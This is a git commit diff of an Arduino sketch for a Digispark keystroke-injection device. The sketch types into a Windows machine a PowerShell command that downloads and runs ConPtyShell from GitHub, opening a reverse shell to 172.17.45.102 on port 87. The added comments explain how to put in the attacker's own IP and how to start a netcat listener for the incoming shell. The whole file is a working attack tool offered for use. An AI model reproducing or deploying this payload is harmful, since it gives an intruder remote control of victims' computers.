34209e8b5a8f0a95d96524cf87a7f534d06f8b86
ashwanthcreators <85355780+ashwanthcreators@users.noreply.github.com>
2021-07-16 18:10:25 +0530

    Update revershell123456789.ino

--- revershell123456789.ino
+++ revershell123456789.ino
@@ -1,5 +1,8 @@
-// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
+// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 30 seconds. 
 // This script credits to Ethical Hacking youtube channel
+// This script contains ip address of 172.17.45.102 , change it to the hackers ip
+// 87 behind the ip is the port . You can change it to your desire in both the script here and the hackers opening port
+// enter the above command as root user in linux ---  stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 172.28.131.38  --- (-s here is ip ) behind -lvnp is the port 
 
 #include "DigiKeyboard.h"
 void setup() {
@@ -9,7 +12,7 @@ void loop() {
 
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.print("ppowershell  -noe -c mode.com con: lines=10 cols=15");
+  DigiKeyboard.print("powershell  -noe -c mode.com con: lines=10 cols=15");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
   DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.45.102 87");
